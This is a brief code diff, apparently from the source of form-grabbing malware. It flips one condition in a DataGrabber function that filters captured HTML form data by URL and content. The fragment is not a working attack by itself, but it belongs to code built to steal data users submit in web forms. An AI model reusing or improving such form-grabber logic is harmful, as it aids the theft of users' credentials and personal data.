@@ -1727,7 +1727,7 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 			if (!FiltrateFormGrabberURL(URL))
 				return false;
 
-			if (FiltrateFormGrabberData(Data))
+			if (!FiltrateFormGrabberData(Data))
 				return false;
         }
 	#endif
